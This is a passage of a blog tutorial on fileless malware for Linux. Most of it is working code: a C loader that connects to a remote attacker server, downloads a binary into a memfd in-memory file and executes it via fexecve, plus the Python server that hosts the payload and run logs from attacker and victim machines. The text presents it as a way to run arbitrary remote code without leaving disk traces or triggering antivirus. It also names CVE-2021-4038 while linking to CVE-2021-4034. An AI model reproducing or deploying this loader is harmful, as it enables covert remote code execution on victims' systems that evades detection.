</span></span><span class=line><span class=cl><span class=n>Read</span> <span class=n>count</span> <span class=o>=</span>  <span class=mi>27104</span>  <span class=o>|</span>  <span class=n>Write</span> <span class=n>count</span> <span class=o>=</span> <span class=mi>27104</span>
</span></span><span class=line><span class=cl> <span class=o>-----------------------------------</span>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>+</span> <span class=p>]</span> <span class=n>Starting</span> <span class=n>execution</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>loader</span><span class=o>.</span><span class=n>o</span><span class=p>:</span> <span class=n>ELF</span> <span class=mi>64</span><span class=o>-</span><span class=n>bit</span> <span class=n>LSB</span> <span class=n>shared</span> <span class=n>object</span><span class=p>,</span> <span class=n>x86</span><span class=o>-</span><span class=mi>64</span><span class=p>,</span> <span class=n>version</span> <span class=mi>1</span> <span class=p>(</span><span class=n>SYSV</span><span class=p>),</span> <span class=n>dynamically</span> <span class=n>linked</span><span class=p>,</span> <span class=n>interpreter</span> <span class=o>/</span><span class=n>lib64</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>x86</span><span class=o>-</span><span class=mf>64.</span><span class=n>so</span><span class=o>.</span><span class=mi>2</span><span class=p>,</span> <span class=n>BuildID</span><span class=p>[</span><span class=n>sha1</span><span class=p>]</span><span class=o>=</span><span class=mi>426</span><span class=n>a7743592788cd18c92a76f22ccfb632700d7b</span><span class=p>,</span> <span class=k>for</span> <span class=n>GNU</span><span class=o>/</span><span class=n>Linux</span> <span class=mf>3.2</span><span class=o>.</span><span class=mi>0</span><span class=p>,</span> <span class=n>with</span> <span class=n>debug_info</span><span class=p>,</span> <span class=ow>not</span> <span class=n>stripped</span>
</span></span></code></pre></div><p>Last line of the output is the proof that our in-memory file executed successfully&mldr; Now we can take it to next level.</p><h3 id=loading-binary-from-network>loading binary from network<a hidden class=anchor aria-hidden=true href=#loading-binary-from-network>#</a></h3><p>Till this point, we know how to write a basic code to load a local binary, create a in-mem file for it and then execute it.</p><p>But an attacker won&rsquo;t just use it run the local binaries which can be executed directly, instead he would like to execute a binary sitting on his server and load that into victim&rsquo;s system directly in memory. This will not be detected with the help of any disk analysis tool or commands like <code>ls</code>. Also, this will be executing safe from &ldquo;Anti-Virus&rdquo; software complete disk-scan features.
In theory, attacker could run anything from his system on victim&rsquo;s system without leaving any trace on harddisk.</p><p>To simulate this, I&rsquo;ve created a pre-setup with <strong>a server that hosts a malicious binary</strong> and victim&rsquo;s system where we have the <code>loader.o</code> present.</p><p>Without further ado, let&rsquo;s get things prepared for out test. We need 3 things:</p><ol><li>loader binary (on victim&rsquo;s machine)</li><li>malicious binary (on attacker&rsquo;s machine)</li><li>tcp socket server to host malicious binary (on attacker&rsquo;s machine)</li></ol><p>I started out with a (not so) malicious binary, which simply creates a plain-text file when executed.</p><p>Source Code: <code>malicious_program.c</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>data</span> <span class=o>=</span> <span class=s>&#34;This malicious program wishes you to have a good day!!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span><span class=o>*</span> <span class=n>fPtr</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;NOTICE_for_U.txt&#34;</span><span class=p>,</span> <span class=s>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>fPtr</span><span class=p>)</span> <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fputs</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>fPtr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fPtr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Compile it -> <code>gcc malicious_program.c -o malicious_program.o</code></p><p>Next, I wrote a small python tcp socket server that will host the <code>malicious_program.o</code> binary.</p><p>Source Code: <code>python_server.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Read binary</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;malicious_program.o&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Host it on 192.168.56.56:1234</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SOL_SOCKET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SO_REUSEADDR</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;192.168.56.56&#39;</span><span class=p>,</span> <span class=mi>1234</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>addr</span><span class=p>)</span>   <span class=c1># Prints the incoming Connection details</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>Finally, we modify the previous local binary loader code to read from connected socket instead of a local binary.</p><p>Source code: <code>network_loader.c</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE         </span><span class=cm>/* See feature_test_macros(7) */</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define BUFF_SIZE 1024
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>memfd_create</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>name</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>prog</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>use</span> <span class=o>=</span> <span class=s>&#34;USAGE: %1$s Destination Port ...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=n>use</span><span class=p>,</span> <span class=n>prog</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ - ] %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ ? ] %s&#34;</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>exit</span><span class=p>(</span><span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buff</span><span class=p>[</span><span class=n>BUFF_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  	<span class=nf>usage</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  	<span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Create mem file (fd1)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ * ] Trying to create a mem file...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fd1</span> <span class=o>=</span> <span class=nf>memfd_create</span><span class=p>(</span><span class=s>&#34;testfd&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Can&#39;t create memfd file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ + ] Created mem file and attached to fd = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Socket stuff begins here
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>serv_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>sock</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>sock</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Socket not created&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>serv_addr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>serv_addr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=nf>htons</span><span class=p>(</span><span class=nf>strtol</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>));</span>   <span class=c1>// set port
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nf>inet_pton</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>serv_addr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>)</span><span class=o>&lt;=</span><span class=mi>0</span><span class=p>)</span>  <span class=c1>// set address
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Invalid address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>connect</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>serv_addr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>serv_addr</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// connect
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Connection failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s> ----------------------------------- </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>read_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>write_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span><span class=p>(</span> <span class=p>(</span><span class=n>read_count</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span> <span class=n>sock</span> <span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>BUFF_SIZE</span><span class=p>))</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  	<span class=k>if</span><span class=p>(</span> <span class=p>(</span><span class=n>write_count</span> <span class=o>=</span> <span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>read_count</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  		<span class=nf>die</span><span class=p>(</span><span class=s>&#34;Failed to write to mem file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  	<span class=n>i</span> <span class=o>+=</span> <span class=n>read_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  	<span class=n>j</span> <span class=o>+=</span> <span class=n>write_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\r</span><span class=s>Read count = %6d  |  Write count = %3d&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s> ----------------------------------- </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ + ] Starting execution...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Change argv params
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// printf(&#34;BEFORE:  %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>argc</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  	<span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>  <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=c1>// printf(&#34;AFTER:   %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// Execute fd1 - with new argv
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>fexecve</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// If fexecve returns, then it is failed.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed Executing....</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>errno</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Compile it &ndash;> <code>gcc network_loader.c -o network_loader.o</code></p><p>With this, we have everything ready with us. Some more steps and we are done.</p><ol><li>Start the python server on attacker&rsquo;s machine. - <code>python3 python_server.py</code></li><li>Place the <code>network_loader.o</code> on victim&rsquo;s machine.</li><li>Politely ask the victim to execute the binary - <code>./network_loader.o 192.168.56.56 1234</code></li><li>Sit back and enjoy!</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## On Attacker&#39;s machine</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>python3</span> <span class=n>python_server</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>16800</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span> <span class=n>fd</span><span class=o>=</span><span class=mi>4</span><span class=p>,</span> <span class=n>family</span><span class=o>=</span><span class=n>AddressFamily</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>type</span><span class=o>=</span><span class=n>SocketKind</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=n>proto</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>laddr</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;192.168.56.56&#39;</span><span class=p>,</span> <span class=mi>1234</span><span class=p>),</span> <span class=n>raddr</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;192.168.56.56&#39;</span><span class=p>,</span> <span class=mi>50812</span><span class=p>)</span><span class=o>&gt;</span> <span class=p>(</span><span class=s1>&#39;192.168.56.56&#39;</span><span class=p>,</span> <span class=mi>50812</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## on victim&#39;s machine</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=o>./</span><span class=n>network_loader</span><span class=o>.</span><span class=n>o</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>56.56</span> <span class=mi>1234</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>*</span> <span class=p>]</span> <span class=n>Trying</span> <span class=n>to</span> <span class=n>create</span> <span class=n>a</span> <span class=n>mem</span> <span class=n>file</span><span class=o>...</span>  
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>+</span> <span class=p>]</span> <span class=n>Created</span> <span class=n>mem</span> <span class=n>file</span> <span class=ow>and</span> <span class=n>attached</span> <span class=n>to</span> <span class=n>fd</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------</span>
</span></span><span class=line><span class=cl><span class=n>Read</span> <span class=n>count</span> <span class=o>=</span>  <span class=mi>16800</span>  <span class=o>|</span>  <span class=n>Write</span> <span class=n>count</span> <span class=o>=</span> <span class=mi>16800</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------</span>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>+</span> <span class=p>]</span> <span class=n>Starting</span> <span class=n>execution</span><span class=o>...</span>
</span></span></code></pre></div><p>And if we check the victim&rsquo;s working directory we can see a file with name <code>NOTICE_for_U.txt</code> there&mldr;. which confirms that the remote binary successfully ran on victim&rsquo;s machine.</p><p><img loading=lazy src=https://media.giphy.com/media/LpLd2NGvpaiys/giphy.gif alt></p><hr><p>Voila! We just executed a remotely located binary without leaving anytrace on harddisk for further analysis. What we have is a loader binary that reads unknown data from somewhere and just executes it. And there is nothing in the loader binary that could be detected as malicious by most of the automated analysis tools&mldr; even VirusTotal does not detect it for what it is.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/716/1*TSWENZxQ7unvU9Qwc3x3xQ.png alt></p><p><em><a href=https://nvd.nist.gov/vuln/detail/cve-2021-4034>CVE-2021-4038</a> describes as a local privilege escalation vulnerability that was found on polkit&rsquo;s pkexec utility. I&rsquo;m not sure if it is a false positive or based on similar signatures.</em></p><hr><h3 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h3><ul><li><a href=https://lwn.net/Articles/631631/>How programs get run: ELF binaries</a> (lwn.net)</li><li><a href=https://tldp.org/LDP/tlk/mm/memory.html>Chapter 3 - Memory Management</a> (tldp.org)</li><li><a href=https://en.wikipedia.org/wiki/Fileless_malware>Fileless Malwares</a> (wikipedia.org)</li><li><a href=https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html>what is fileless malware</a> (norton.com)</li><li><a href=https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/>covert code faces a heap of trouble in memory</a> (sophos.com)</li><li><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats>Intelligence: File less threats</a> (microsoft.com)</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://ayedaemon.github.io/tags/c-programming/>C programming</a></li><li><a href=https://ayedaemon.github.io/tags/security/>Security</a></li><li><a href=https://ayedaemon.github.io/tags/linux/>Linux</a></li></ul><nav class=paginav><a class=prev href=https://ayedaemon.github.io/post/2022/05/eudyptula-task-1/><span class=title>« Next</span><br><span>Eudyptula Task1</span>
</a><a class=next href=https://ayedaemon.github.io/post/2021/02/git-form-inside-out/><span class=title>Prev »</span><br><span>Git Form Inside Out</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://ayedaemon.github.io/>Connected</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>